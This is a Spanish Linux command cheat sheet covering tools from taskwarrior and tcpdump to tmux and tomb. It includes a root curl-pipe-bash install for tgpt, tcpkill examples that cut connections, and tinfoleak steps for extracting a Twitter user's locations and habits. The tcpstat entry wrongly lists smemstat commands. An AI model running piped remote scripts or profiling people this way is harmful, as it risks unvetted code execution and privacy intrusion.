$ task add project:DocsPendientes Titulo Entrada (organizar en proyectos)
$ task add recur:monthly (programar tareas que se repiten en el tiempo)
$ task add pri:H Titulo Entrada (establecer prioridades: H=high, M=medium, L=low)
$ $ task all (ver incluso las taareas vencidas)
$ task 5 start (indicar que la tarea 5 ha empazado)
$ task 5 modify due:'2024-12-15' (o que la dejamos para otro dia)
$ task project:DocsPendientes (ver todas las tareas dentro del proyecto mencionado)
$ task -tag list (lista todas las tareas sin el tag "tag")
$ task +tag list (lista todas las tareas con el tag "tag")
$ task long (ver las tareas en formato largo)
$ task +WEEK list (lista las tareas con el deadline de esta semana)
$ task +DUETODAY list (lista todas las tareas con el deadline de hoy)
$ task due.after:yesterday and due.before:thursday (filtraar de forma más especifica)
$ task 5 project:DocsPendientes (añadir a la tarea 5 al proyecto DocsPendientes)


tc
Controlar, clasificar, dar forma y programar el tráfico de la red.
# tc qdisc
# tc -c -d qdisc
# tc -g class show dev enp1s0 (Muestra clases como gráfico ASCII en la interfaz enp1s0)
# tc qdisc show dev enp0s0


tcpbench
Herramienta que realiza evaluaciones comparativas de rendimiento y muestreo simultáneo de variables de red del kernel.
$ tcpbench -n (modo servidor, donde escuchará todos interfaces para conexiones entrantes)
$ tcpbench 127.0.0.1


tcpdump
Capturar el trafico de la red.
# tcpdump -D (Ver las distintas redes disponibles)
# tcpdump -nni any (Capturar todas las interfaces de red del equipo)
# tcpdump -n -i eth0 -s 1515 -w archivo (que la información se guarde en archivo)
# tcpdump -n -i eth0 -s 1515 -l | tee archivo (verlo en pantalla y que se guarde en archivo)
# tcpdump -n -r archivo -c 4 (analizar ficheros)
# tcpdump -n -r archivo udp (filtrar por protocolos - udp, tcp, icmp, arp ...)
# tcpdump -n -r archivo -c 2 not tcp (con operadores booleanos [not, and]. Ver las 2 primeras capturas que no sean tcp)
# tcpdump -n -r archivo -c 2 not tcp and not udp (Ver las 2 primeras capturas que no sean tcp ni udp)
# tcpdump -n -r archivo -c 2 tpc and dst port 25 (Ver las 2 primeras capturas tcp y dst con destino al puerto 25)
# tcpdump -enni eth0 (info de la capa de enlace y MACs origen y destino)
# tcpdump host 192.168.1.3 (Capturar todo el tráfico del host especificado)
# tcpdump src net 192.168.1.0/28 (Especificando una red)
# tcpdump src host 192.168.1.3 (Solo lo que salga de la IP especificada)
# tcpdump dst port 23 (Todo el trafico que vaya dirigido al puerto 23)
# tcpdump udp and dst port 53 (Capturar tráfico de comunicación con las DNS)
# tcpdump tcp and not port 80 (Capturar todo el tráfico excepto el web)
# tcpdump tcp and port 80 (Capturar solo el web)
# tcpdump -i eth0 port not 80 and host www.google.com (Para saber si google manda “cosas” por otros puertos que no sean el 80)
# tcpdump -n -i eth1 -X tcp (Ver información del contenido de los paquetes)
# tcpdump ether src 01:20:21:00:00:B2 (Captura tráfico de la mac)
# tcpdump udp and dst port 53 (Capturar peticiones DNS)
# tcpdump tcp and (port 22 or port 23) (Capturar el tráfico telnet y ssh)
# tcpdump portrange 21-23 (tráfico origen/destino de los puertos 21, 22 o 23)
# tcpdump -n -i eth1 -X -s 200 port 9001 (de un puerto concreto)
# tcpdump -v -i eth1 port 9001 | awk '{print$1,$2,$3}'
# tcpdump port 9001 (Capturar todo el tráfico del puerto especificado)
Algunas opciones:
-n (Para no resolver las direcciones IP)
-i (Indica la interfaz de red)
-s (volumen de la parte del paquete que queremos capturar [1515 es suficiente])
-c (cantidad de mensajes a visualizar)
-p (no cambia la interfaz a modo promiscuo)
-x (ver los contenidos de los paquetes)
-r archivo (Para leer los datos de un archivo guardado con la opción -w)
src (Dirección y puerto origen)
dst (Dirección y puerto destino)
1.-
Ejemplo de un proceso:
# tcpdump -nni eth0 'port 80' -w /tmp/port.80 (Capturar el tráfico por el puerto 80 y mandarlo a un archivo)
# tcpdump -r /tmp/port.80 -nn (Análisis básico de los datos)
# tcpdump -r /tmp/port.80 -nn 'host !216.158.240.43' (Filtrar los datos descartando un host)
# tcpdump -r /tmp/port.80 -nn 'host !216.158.240.43' -w /tmp/port.80.b (Lo mismo enviando los nuevos datos a otro fichero)


tcpick
Muestra información sobre conexiones, carga, datos FTP, HTTPS, download...
# tcpick -i eth0 -C (con color)
# tcpick -i eth0 -C -a "port 80" (muestrar en color [C] y nombres de host [a] en un puerto)


tcpkill
[dsniff)]. Matar o impedir conexiones tcp.
# tcpkill -i eth1 host www.facebook.com (imposibilitará entrar en facebook)
# tcpkill -i eth0 host www.facebook twitter.com (especificar varias urls separadas por un espacio)
# tcpkill -i eth0 port 22 (especificando un puerto)


tcpstat
Informa de estadísticas de la red al igual que vmstat [ver] lo hace para las estadísticas del sistema. El valor predeterminado es 5 segundos.
# smemstat 4 3 (monitorear 3 veces cada 4 segundos)
# smemstat -dm -o smemstat.json (informe en megabytes, eliminando ruta del directorio y el resultado en el archivo smemstat.json)


tcptrack
aplicación que muestra el consumo de la conexión.
# tcptrack -i eth1 port 22 -f (Especificando conexión, puerto y habilitar el algoritmo de velocidad media rápida [-f])
# tcptrack -i eth1 port 21 or 80 (Especificando dos puertos)
# tcptrack -i eth0 "dst port 80" (Sólo mostrar las conexiones destinadas al puerto 80)
# tcptrack -i eth1 -r 10 -d (Mostrar las conexiones 10 segundos más de cuando se cierren, por defecto son 2 segundo [r] y sin rastrear las conexiones existentes [d])
# tcptrack -T network.pcap > network.txt (Mandando el resultado a un archivo [-T])
Algunas teclas de control:
p (Pausar)
q (salir)
s (Cada vez que se pulsa la letra cambia a alguna de las 3 opciones de ordenación: sin ordenar (por defecto), por categoría y por bytes)


tdc
Reloj acoplable simple y pequeño. Es una herramienta útil para escritoprios OpenBox, FVWM, Enlightenment o ion3. Puede usar cualquier formato de fecha POSIX.
$ tdc (formato básico solo mostrando hora, minuto y segundo)
$ tdc -w 120 -f "%d/%m/%Y %H:%M" -ce -cl grey40 (con medida especificada [por defecto 64], determinado formato del dia [f] en el calendario [ce] y color grey40 [cl])
$ tdc -w 230 -f "%d %b %Y %T" (Otra presentación)


teclado
Ver setxkbmap.
Achivo de configuración:
# nano /etc/default/keyboard
	XKBMODEL="pc105"
	XKBLAYOUT="es,de,fr,us"
	XKBVARIANT="cat"
	XKBOPTIONS=""
	BACKSPACE="guess"
# dpkg-reconfigure keyboard-configuration
Reiniciar.
1.-
Con el paquete console-data
Al instalar el paquete, solicita la informacion del teclado, para modificarla:
# dpkg-reconfigure console-data
2.-
En ciertas ocasiones es necesario modificar del archivo:
# nano /etc/initramfs-tools/initramfs.conf
El parametro:
KEYMAP=y


tee
Muestra la salida de un comando en pantalla y al mismo tiempo la graba en un archivo
$ rkhunter -c -sk | tee rkhunter.txt
$ rkhunter -c -sk | tee -a rkhunter.txt (Añadirá la entrada al final del fichero)


telegram
[libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev]. Aplicación de mensajería instantanea más rápida, segura y libre que WhatsApp.
Descarga y compilación:
	$ wget https://github.com/vysheng/tg/archive/master.zip -O tg-master.zip
	$ unzip tg-master.zip
	$ cd tg-master
	$ ./configure
	$ make
Registro:
	$ ./telegram -k tg.pub (Solicita el número de móvil con el prefijo del país [+34xxxxxxxxx],
          al momento recibimos un sms con el número de código [xxxxx] que introduciremos en la terminal)
	$ ./telegram -N (Arrancar la aplicación lista para poder descargar fotos y videos)
Algunas teclas de control:
	help (Mostrar todos los comandos disponibles)
	msg contacto texto_a_enviar (Enviar mensaje a un contacto. Han de escribirse las primeras
         letras del contacto y pulsar tabulador para autocompletar)
	contact_list (Muestra la lista decontactos)
	suggested_contacts (Muestra sugerencias de contactos)
	add_contact núm_telefono nombre apellido (Añadir un contacto)
	chat_with_peer contacto (Xatear todo el rato con el mismo contacto)
	history contacto [limite] (Muestra la conversación con el contacto especificado. Si no se
         especifica limite,    por defecto son 40 lineas. Tambien pone como leidos todos los mesajes)
	dialog_list (Muestra mensajes pendientes)
	user_info contacto (Muestra información del contacto)
	stats (Muestra datos de nuestra cuenta)
	send_photo contacto archivo.jpg (Enviar a contacto una imagen)
	send_video contacto archivo.avi (Enviar un video a un contacto)
	send_text contacto archivo.txt (Enviar un texto a un contacto)
	fwd contacto id (Buscar el mensaje con el número de id especificado)
	mark_read contacto (Marcar todos los mensajes del contacto como leidos)
	rename_contact contacto nombre apellido (Renombrar un contacto)
	create_secret_chat contacto (Crear un chat privado con un contacto)
	set log_level 0 (Desactivar información de cuando se conectan los sontactos)
	set msg_num 1 (Antiva la numeración de los mensajes. con un valor 0 los desactiva)
	load_photo ID (Descargar una photo especificando el ID. Crea el dir ~/.telegram/download)
	load_video ID (Descarga un video)
	quit (Salir)
Otros valores para log_level:
	1 (imprime información acerca de los mensajes leídos)
	2 (imprime la línea, cuando alguien está escribiendo en el chat)
	3 (Informa cuando alguien cambia de estado en linea
1.-
Pra hacer permanentes algunas opciones:
$ nano .telegram/config
	log_level = 0;
	msg_num = 0;


telinit
Modifica o cambia el runlevel [inittab].
# telinit -t 10 6 (que reinicie [6] en 10 segundo [-t 10])
# telinit q (releer archivo de configuración si se ha modificado)


telnet
Protocolo que sirve para emular una terminal remota, con lo que permite ejecutar comandos introducidos con un teclado en un equipo remoto.
# telnet 123.86.22.190 (conectarse a un equipo remoto)
# telnet maquina_remota.com (especificando nombre del host)
# telnet 123.86.22.190 80 (conectarse a un equipo remoto con un puerto especifico)
Tambien puede usarse para comprobar localmente si un puerto está abierto:
# telnet 192.168.0.27 3000
Si la conexión está abierto muestra una salida:
	Trying 192.168.0.27...
	Connected to 192.168.0.27...
Si el puerto está abierto pero no hay ningún demonio atendiendo peticiones:
	Trying 192.168.0.27..
	telnet: Unable to connect to remote host: Connection refused
Si el puerto está protegido por un cortafuegos no obtengamos respuesta:
	Trying 192.168.0.10...


tempfile
[debianutils]. Crea un archivo temporal de una manera segura.
$ tempfile
$ tempfile -p 4463 (lo crea con un prefijo especificado. El resultado es parecido a /tmp/4463pAawmz)
$ tempfile -s nota (lo crea con un sufijo especificado. El resualtado es parecido a /tmp/fileKpYlf4nota)


termdebug
Utilidades que ayudan a grabar, reproducir y comparar sesiones interactivas en la terminal. Incluye las aplicaciones: tdcompare, tdrecord, tdreplay, tdrerecord y tdview.
$ tdrecord salida (iniciará la grabación de la sesión de terminal y almacenará los comandos ejecutados y las salidas en "salida")
$ tdreplay salida (reproduce la sesión del archivo grabado)
$ tdrerecord salida nueva_salida (tomar la sesión grabada en "salida" y creará una nueva grabación en nueva_salida)
$ tdcompare salida nueva_salida (muestra las diferencias entre las dos sesiones grabadas)
$ tdview salida (visualizar el contenido de una grabación sin reproducirla en la terminal)


terminal
Nombre de la consola propia de xfce. El archivo de configuración se encuentra en:
$ nano .config/Terminal/terminalrc


terminalize
[nodejs npm build-essential libgconf-2-4]. Grabaciones de terminal y gifs animados. Página del poyecto: <https://github.com/faressoft/terminalizer>
$ terminalizer record nombre_proyecto (empezar la grabación)
$ terminalizer play nombre_proyecto (reproducir)
$ terminalizer render nombre_proyecto (crear el gif)


terminator
Terminal que puede dividirse horizontalmente y verticalmente.
$ terminator -T linux --geometry 1150x250 (Especificando un titulo y medidas)
Algunos atajos:
	Ctrl + Mayus + o (División horizontal)
	Ctrl + Mayus + e (División vertical)
	Ctrl + Mayus + w (Cerrar ventana)
	Ctrl + Mayus + cursores (Redimensionar ventana)
	Alt + cursores (Moverse por las ventanas)
	Ctrl + Mayus + t (Abrir nueva pestaña)
	Ctrl + RePag / AvPag (Moverse entre pestañas)
	Ctrl + Mayus + q (Cerrar terminator)


terminews
Aplicación que permite administrar recursos RSS y mostrar sus fuentes de noticias. Divide la pantalla en 3 areas: Lista de sitios, Lista de noticias de cada canal y el resumen que contiene información adicional del evento seleccionado.
Combinaciones de teclas:
              tab            Cambia entre la lista de sitios y la lista de noticias alternativamente
              enter          Recupera el canal de noticias del sitio seleccionado
              Ctrl o         Descarga el contenido del evento seleccionado
              Ctrl Alt o     Abre el evento seleccionado utilizando el navegador predeterminado
              Ctrl n         Entrar nueva URL a la lista de sitios
              Ctrl f         Buscar entre los sitios existentes. Se permiten varios términos y se utilizan de forma conjunta
              Ctrl q         Cierra cualquier ventana
              Ctrl b         Agrega o elimina el evento seleccionado en la lista de marcadores
              Ctrl Alt b     Muestra los eventos marcados
              Del            Elimina el sitio seleccionado
              Flecha arriba  Se desplaza al elemento de lista anterior de forma circular
              Flecha abajo   Se desplaza al siguiente elemento de lista de forma circula
              PgUp           Va a la página de lista anterior de forma circular
              PgDn           Va a la página de lista siguiente de forma circular
              Ctrl h         Abre la ventana de las combinaciones de teclas
              Ctrl c         Cierra la aplicación


terminology
Emulador de terminal para sistemas Linux/BSD/UNIX que usa EFL. Se usa como su emulador de terminal vt100 normal con todas las características habituales, como compatibilidad con 256 colores. Terminology está diseñada para emular Xterm en la mayoría de los aspectos.
$ terminology (arrancar el emulador)
$ tycat imagen.png (muestra la imgen en el emulador)


termit
Emulador de terminal con soporte para múltiples pestañas, codificación de conmutación, sesiones, combinaciones de teclas configurables, lenguaje Lua incorporado y título de ventana dinámica similar a xterm.


termite
Emulador de terminal.
$ termite --geometry=900x150 (Especificando medidas)
$ termite -e htop (Ejecutar una aplicación)


termsaver
Salvapantallas para la terminal.
$ termsaver quotes4all (Irá mostrando citas extraidas de quotes4all.net)
Otras opciones:
	asciiartfarts (Imagenes en ascii)
	clock (Un reloj digital)
	dot (Un punto)
	rfc (Contenido RTC [conjunto de documentos que sirven de referencia para la comunidad de Internet])
	matrix (Código matrix)
$ termsaver programmer --help (Muestra ejemplos de como usar la opción indicada)
$ termsaver randtxt --word linux_es_un_sistema_genial --delay 1 (Mostrará la frase cada segundo en un lugar distinto de la pantalla)
$ termsaver urlfetcher -u lapipaplena.org (Mostrará el código de la página indicada)
$ termsaver programmer -p script.sh (Mostrará el código indicado linea a linea)


termtosvg
Graba todo lo que vamos escribiendo en la terminal y sus salidas, en formato SVG, desde que lanzamos la aplicación hasta que escribamos "exit". La grabación se guarda en /tmp.
      $ termtosvg
      Recording started, enter "exit" command or Control-D to end
      $   (empezamos a escribir comandos y cuando terminemos:)
      $ exit
      Rendering ended, SVG animation is /tmp/termtosvg_6nxfvxdm.svg
La visualizamos, por ejemplo:
$ firefox /tmp/termtosvg_6nxfvxdm.svg


test
Comprobar tipos de archivos y comparar valores, devolviendo 1 si es cierto y o si es falsa.
Sobre ficheros:
	$ test -e archivo; echo $? (Devuelve 0 si archivo exist)
	$ test -f archivo; echo $? (Devuelve 0 si archivo existe y es un archivo regular)
	$ test -d archivo; echo $? (Devuelve 0 si existe y es un directorio)
	$ test -s archivo; echo $? (Devuelve 0 si archivo existe y tiene un tamaño mayor que 0)
	$ test archivo -nt archivo2; echo $? (Devuelve 0 si archivo se ha modificado con posterioridad a archivo2)
	$ test archivo -ot archivo2; echo $? (Devuelve 0 si archivo se ha modificado con anterioridad a archivo2)
Sobre caracteres numéricos:
	$ test $int1 -eq $int2; echo $? (Devuelve 0 si los enteros son iguales)
	$ test $int1 -ne $int2; echo $? (Devuelve 0 si los enteros NO son iguales)
	$ test $int1 -lt $int2; echo $? (Devuelve 0 si int1 es menor que int2)
	$ test $int1 -le $int2; echo $? (Devuelve 0 si int1 es menor o igual que int2)
	$ test $int1 -gt $int2; echo $? (Devuelve 0 si int1 es mayor estricto que int2)
	$ test $int1 -ge $int2; echo $? (Devuelve 0 si int1 es mayor o igual que int2)
Sobre strings:
	$ DIR=home; test $string; echo $? (Devuelve 0 si la cadena no es nula)
	$ test -z $DIR; echo $? (Devuelve 0 si la longitud del string es 0)
	$ test -n $DIR; echo $? (Devuelve 0 si la longitud del string NO es 0)


testdisk
[photorec]. Escaneo y reparación de particiones.
$ testdisk /list (Muestra todas las particiones incluso las no montadas)


texi2html
Pasar archivos infotex a html.
$ texi2html archivo.texi


tfortune
Al igual que fortune, tfortune es una utilidad que imprime un epigrama aleatorio en inglés.
$ tfortuna print


tgpt
Útil para iniciar una conversación interactiva con ChatGPT en la terminal y realizar multiples preguntas sin salir del entorno. Descarga e instalación:
# curl -sSL https://raw.githubusercontent.com/aandrew-me/tgpt/main/install | bash -s /usr/local/bin
$ tgpt (iniciar la conversación)
  > explicame que es un script de bash


thefuck
Muestra a partir de una serie de reglas de coincidencia algun comando que se ha escrito mal en la terminal o del que solo se han escrito unas letras puestas. Una vez puesta la posible coincidencia, con "intro" se acepta, con las fechas muestras otras posibles coincidencias y con C-c se aborta.
$ thefuck hp-s
$ thefuck mkder


themonospot
Aplicación para escanear archivos .avi o .mkv para obtener información sobre sobre el flujo de datos de audio y video. Esta aplicación nos dirá el codec usado, la calidad del audio, resolución, etc…
$ themonospot video.avi


thermald
Demonio que monitorea y controla la temperatura en portátiles y tabletas con las últimas versiones de CPU de Intel. Una vez que la temperatura del sistema alcanza un cierto umbral, el daemon activa varios métodos de enfriamiento.


thunar
Escritorio.
$ thunar -B (Con varios ficheros seleccionados, al pulsar F2 se abre la ventana para renombrarlos)
$ thunar-volman-settings (Abre el gestor de medios extraíbles)
1.-
Modificar el tema de iconos por defecto:
Descomprimir la carpeta de iconos y moverla:
# mv GartoonRedux /usr/share/icons
Editar o crear el archivo:
$ nano .gtkrc-2.0
Y modificar o añadir la linea:
gtk-icon-theme-name = "GartoonRedux"
Al abrir nuevamente thunar, se muestran los cambios.
2.-
Para habilitar el automontado de dispositivos, además de configurarlo en las propiedades, en algunas distros se precisan los paquetes gvfs gvfs-afc
3.-
Para incluir en el menú contextual la opción "Abrir como root", en "editar/Configurar acciones personalizadas", "añadir" [+] y en la pestaña "Basico" colocar en el cuadro de diálogo:
	nombre: Abrir directorio como root
	descripcion: Abrir directorio con privilegios de root
	comando: gksu thunar %f
	icono: opcional
Y en la pestaña "condiciones generales":
	Patrón de archivos: *
	Aparece si la selección contiene:  Macamos la casilla de directorio y la de archivo


thunderbird
Cliente de mensajeria. Algunos atajos:
	f (Ir al siguiente mensaje)
	b (Ir al mensaje anterior)
	n (Ir al siguiente mensaje no leído)
	p (Ir al anterior mensaje no leído)
	m (Marcar mensaje como leído)
	j (Eliminar mensaje como basura)
	F6 (Alternar entre los tres paneles)
	F8 (Expandir/desexpandir el panel del listado de mensajes)
	Ctrl m (Redactar mensaje)
	Ctrl Enter (Enviar mensaje)
	Ctrl + (Aumentar tamaño del texto)
	Ctrl - (Reducir el tamaño del texto)
	Ctrl 0 (Restaurar el tamaño del texto)
	Ctrl o (Abrir mensaje en una nueva ventana)
	Ctrl w (Cerrar ventana)
	Ctrl r (Responder al mensaje al remitente)
	Ctrl q (Salir)


tidy
Validación y corrección de archivos html
$ tidy fichero.html  (Analiza el código del fichero)
$ tidy -m fichero.html  (Corrige,modificándolo, el código del fichero)
$ tidy -m -asxml fichero.html  (Convierte un html a xml)
$ tidy -m -asxhtml fichero.html ( Convierte un html a xhtml )
$ tidy -m -ashtml fichero.xhtml  ( Convierte un xhtml a html)


tiger
Chequear vulnerabilidades del sistema. Informe en /var/log/tiger
# tiger  (Sin parámetros, escanea todo el sistema)
# tiger -H -l /home/user/logs (crear un html con los resultados y guardarlo en el directorio “logs”)


tightvncserver
(En el cliente: xtightvncviewer). Conexión remota.
En el Servidor:
# tightvncserver -depth 16 -geometry 640x480
En el Cliente:
$ xtightvncviewer
Nota.- Sale una caja de texto donde entrar la ip o nombre del host y otra para ingresar la clave.


tilix
Emulador de terminal en mosaico.
$ tilix --quake (usar tilix como una terminal desplegable)
$ tilix -a session-add-right -x sudo apt update (iniciar dividiendo la terminal a la derecha [a] y ejecutar [x] "apt update")
Otras opciones del parámetro "a" son:
     sesión-add-down - Dividir la terminal por debajo
     app-new-window  - Crear nueva ventana de terminal
     app-new-session - Crear nueva sesión


time
Devuelve el tiempo de ejecución de un comando o aplicación.
$ time netstat -anpt
# time nmap -sS www.tuxapuntes.com
$ time echo "scale=5000; 4*a(1)" | bc -l -q (Calcula 5000 decimales de pi para comprobar velocidad del procesador)


timedatectl
Informa o ajusta la hora del sistema en sistemas Linux con Systemd
# timedatectl status (Informa de la hora configurada mostrando el time zone, la hora universal y otros datos)
# timedatectl list-timezones (consultar todas las zonas horarias)
# timedatectl show  (Muestra la configuración actual del reloj del sistema)
# timedatectl set-time "2014-05-26 11:13:54" (Define el dia y la hora de forma manual)
# timedatectl set-timezone Europe/Madrid (establecer dia y hora de España)


timelimit
Especifica una duración para un proceso o comando.
$ timelimit -t10 tail -f /var/log/apache2/access.log (mostrará el archivo durante 10 segundos)


timeout
Limita el tiempo de funcionamiento de un comando o aplicación.
$ timeout 60m firefox (arrancará firefox y se cerrará a los 60 minutos ["s" para segundos, "h" para horas y "d" para dias])
$ timeout 0.5m top (arrancará el comando top durante 30 segundos)
$ timeout -s SIGINT 6s ping google.com (enviar señal SIGINT en lugar de SIGTERM al alcanzar 6 segundos)


times
Muestra los tiempos de usuario y sistema acumulados para procesos ejecutados desde el interprete de comandos


timidity
Convertir formatos de audio de midi a wav  o a ogg
$ timidity -Ow -s 44100 -o output.wav input.mid  (MIDI -> WAV)
$ timidity -Og -s 44100 -o output.ogg input.mid  ( MIDI -> OGG)


tinfoleak
[tweepy]Mostrar información de twitter sobre un nick concreto. Descarga: <http://vicenteaguileradiaz.com/tools/>
registro en twitter:
Una vez descargada requiera registrar la aplicación en twitter y obtener una Consumer Key y Consumer secret, así como un Token Key y Token Secret, que deberemos rellenar dentro del script .py. Para ello nos loggeamos en nuestra cuenta de twitter y vamos a <https://apps.twitter.com/app/new> y le damos un nombre personal, descripción y un sitio web tipo http://www.algo.com). Una vez creado aparecerá una pestaña llamada API Keys, en la que podremos obtener los valores API Key y API Secret (que son el Consumer Key y Consumer Secret, respectivamente, a rellenar en el script). Luego generar un Token Key y Token secret. Pulsar en el botón "Generate Access Token" y generará un par de valores Access Token y Access Token Secret. Con estos datos rellenamos las variables  CONSUMER_KEY = ‘ ‘, CONSUMER_SECRET = ‘’, ACCESS_TOKEN = ‘ ‘ y ACCESS_TOKEN_SECRET = ‘ ‘ del script.
$ python tinfoleak.py (Ayuda y muestra parámetros)
$ python tinfoleak.py -n usuario -b (Información del usuario)
$ python tinfoleak.py -n usuario -stc 500 (Mostrar aplicaciones usadas por el usuario analizando los últimos 500 twits)
$ python tilfoleak.py -n usuario -gtc 1000 (Mostrar lugar y coordenadas del usuario, incluyendo fecha y hora analizando los últimos 1000 twits)
$ python tinfoleak.py -n usuario -h (Mostrar hashtags usado por el usuario analizando los últimos 100 twits)
$ python tinfoleak.py -n usuario -m (Mostrar menciones de otros usuario analizando los últimos 100 twits)
$ python tinfoleak.py -n usuario -f palabra (Mostrar publicaiones del usuario que inclyen la palabra especificada de los últimos 1000 twits)
$ python tinfoleak.py -n usuario -bsgthmc 1000 --sdate 2014/10/01 --stime 08:00:00 -etime 22:00:00 (Mostrar información básica del usuario, apps, hashtags usados, menciones, coordenadas, fehca y hora de cada twit, analizando los últimos 1000 twits desde la fehca especificada y en la franja horaria de 8 a 22 horas)


tinyproxy
Crear un proxy HTTP. editar el archivo de configuración:
# nano /etc/tinyproxy/tinyproxy.conf
descomentar las lineas:
	Allow 127.0.0.1 (Si solo queremos conexión en nuestra máquina)
	Port 5023 (modificar el puerto). Por defecto 8888)
	DisableViaHeader Yes (Desactivar la cabecera)
# etc/init.d/tinyproxy restart (Reiniciar el servicio)
Los errores se almacenan en /var/log/tinyproxy/tinyproxy.log
Cuando se quiera usar con el navegador entrar los datos del proxy en Opciones -- Avanzado -- Red


tiptop
Herramienta que proporciona una vista dinámica en tiempo real de las tareas que se ejecutan en el sistema. A menos que tiptop sea ejecutado por root, el usuario solo puede monitorear las tareas que posee.
$ tiptop (arrancar el monitoreo. "q" para cerrar)
# tiptop -u USER (las de un usuario)


tldr
Muestra información de un comando como las páginas man pero más simplificada,como si fueran versiones resumidas de man com más ejemplos.
$ tldr --update (primero despues de instalarla, recargar la base de datos y lanzarlo periodicamente)
$ tldr comando
$ tldr -l (listar)
$ tldr --color auto tar


tleds
Monitoreo del tráfico de red con los leds del teclado. Si el teclado posee los 3 leds de arriba del teclado numérico puede simularse las luces del router con esta aplicación.
# tleds -d 10 wlan0 (con actualización cada 10 milisegundos)
# tleds -q -c -d 25 eth0


tload
Muestra el promedio de carga en el terminal en forma de dibujos de caracteres.
$ tload -d 2 (Con actualizacion cada 2 segundos)


tlp
herramienta avanzada de administración de energía para Linux. Viene con un configuración predeterminada ya optimizada para la duración de la batería. Al mismo el tiempo es altamente personalizable. Puede habilitar o deshabilitar los dispositivos de radio bluetooth, WiFi y WWAN al iniciar el sistema.
# tlp start (iuniciar la herramienta)
# tlp-stat -b (información de la bateria)
# tlp-stat -s (consultar estado)
# tlp-stat -c (mostrar configuración)
Otras opciones:
	-u (Información de los dispositivos)
	-g (de los gráficos)
	-r (de la radio)
	-t (temperaturas)
	-w (errores)


tmpfs
Permite asignar parte de la memoria física para ser utilizada como una partición lo que permite una vez montada, leer o escribir archivos de la RAM como si de una partición de disco se tratara. Dado que se está escribiendo en la memoria RAM del sistema, esta se borra en un reinicio o en un cuelgue. Relacionado con ramfs [ver], se diferencia de este en que tmpfs usa swap y que no permite escribir más que el tamaño que se ha especificado en el montaje. El proceso:
# mkdir /media/tmp
# mount -t tmpfs -o size=20m tmpfs /media/tmp
Comprobar con df -k [ver] o mount [ver] su correcto montaje


tmux
Terminal multiplexor
$ tmux (lanzar la aplicación)
$ tmux ls (listar las sesiones tmux abiertas)
$ tmux attach -t 0 (sincronizarse con la sesión 0 [attach] en local o en remoto via ssh)
$ tmux rename-session -t 0 tty1 (renombrar la sesion 0 a tty1)
$ tmux kill-window -t 2 (matar una ventana con el número 2)
$ tmux kill-session -t 2 (matar una sesión con el número 2)
$ tmux new-session -s hack_wifi (abrir sesión con un nombre)
$ tmux new-session -d 'htop' (lanzar un comando en una nueva sesión sin unirse a ella)
$ tmux list-commands (listar la sintaxis de todos los comandos soportados)
$ tmux list-keys (listado de todas las teclas de control)
$ tmux new-session -d 'vi /etc/apt/sources.list' \; split-window -d 'newsbeuter' \; attach (arrancar una sesión tmux con el sources.list en el panel superior y con el lector RSS newsbeuter en el inferior)
$ tmux new-session \; split-window \; split-window -h \; split-window -v \; attach (Arrancar la aplicación con varios panels horizontales y verticales)
Atajos:
	Ctrl+b c (Crear una nueva ventana)
	Ctrl+b d (Salir de tmux actual (detach) sin cerrar sesión)
	Ctrl+b n (Ir a la ventana siguiente)
	Ctrl+b p (Ir a la ventana anterior)
	Ctrl+b & (Matar la ventana actual, incluye todos los paneles)
	Ctrl+b x (Matar panel actual)
	Ctrl+b , (cambiar el nombre de la ventana actual )
	Ctrl+b % (Dividir verticalmente la ventana actual en dos paneles)
	Ctrl+b " (Dividir horizontalmente la ventana actual en dos paneles)
	Ctrl+b q (Mostrar brevemente los números de cada panel)
	Ctrl+b o (Cambiar al siguiente panel)
	Ctrl+b ? (Lista todas las combinaciones de teclas de control)
	Ctrl+b w (Lista todas las ventanas)
	Ctrl+b núm (Moverse a la ventana seleccionada (0-9). No al panel)
	Ctrl+b up (Ir al panel de encima)
	Ctrl+b down (Ir al panel de abajo)
	Ctrl+b left (Ir al panel de la izquierda)
	Ctrl+b right (Ir al panel de la derecha)
	Ctrl+b t (Muestra en el panel un reloj digital)
	Ctrl+b s (Elegir sesión)
	Ctrl+b [ (Entra en modo scroll con la teclas del cursor. Termina pulsando q)
1.-
Muestra para colorear los paneles:
Crear en el directorio personal el archivo oculto:
$ touch .tmux.conf
Con el siguiente contenido [modificar al gusto]
	# default statusbar colors
	set -g status-fg colour136
	set -g status-bg colour235
	set -g status-attr default
	# default window title colors
	setw -g window-status-fg colour244
	setw -g window-status-bg default
	setw -g window-status-attr dim
	# active window title colors
	setw -g window-status-current-fg colour166
	setw -g window-status-current-bg default
	#setw -g window-status-current-attr bright
	setw -g window-status-current-attr underscore
	# panel border
	set-option -g pane-border-fg white #base02
	set-option -g pane-active-border-fg colour46 #base01
	# command/message line colors
	set -g message-fg white
	set -g message-bg black
	set -g message-attr bright
	# pane number display
	set-option -g display-panes-active-colour colour33 #blue
	set-option -g display-panes-colour colour166 #orange
	# clock
	set-window-option -g clock-mode-colour colour64 #green


tmuxinator
gema de ruby que permite definir pestañas, páneles y comandos que correrán en cada uno de los paneles de una sesión tmux. Cada proyecto guarda su configuración en un archivo .yml en el directorio ~/.tmuxinator. En el archivo .bashrc ha de constar la variable $EDITOR [export EDITOR=/usr/bin/vim, nano o el que sea]
	$ tmuxinator new proyecto1 (Crear un proyecto)
	$ tmuxinator proyecto1 (Abrir un proyecto)
	$ tmuxinator open proyecto1 (Editar un proyecto)
	$ tmuxinator list (Listar todos los proyectos)
	$ tmuxinator delete proyecto1 (Suprimir un proyecto)
	$ tmuxinator doctor (Ver problemas en la configuración)
	$ tmuxinator implode (Suprimir todos los proyectos)
Muestra de un archivo.yml:
	name: proyecto1
	root: ~/
		windows:
				- editor:
				layout: main-vertical
				panes:
					- top
					- who; pwd


toe
Enumera todos los tipos de terminal disponibles por nombre principal con descripciones.
$ toe -a -s (informe sobre todas las bases de datos de terminal y una columna con entradas perteneentes a una base de datos de terminal determinada.)


toilet
(figlet mejorado). Edición de banners
$ toilet -f future -F gay texto
$ toilet -t -f smblock -F metal -E html texto
Opciones
-f bigmono12 (Otras fuentes: bigmono9, circle, emboss, emboss2, future, mono12, mono9, smblock, smbraille, smmono12, smmono9)
-F gay (filtro "gay" o "metal")
-E html (Saca en formato en html para su inclusión en una web)
-t (se adapta al ancho de la terminal)
-S (letras más juntas. Por defecto es -s)
-o (más juntas)


tomb
Encriptar directorios. Por seguridad ha de desactivarse la partición swap (intercambio) antes de crear la tumba o al acceder a ella a menos que tengamos la swap encriptada.
# swapoff -a (“swapon” para activarla nuevamente)
En algunas distros es necesario activar el demonio:
# /etc/init.d/cryptdisks start
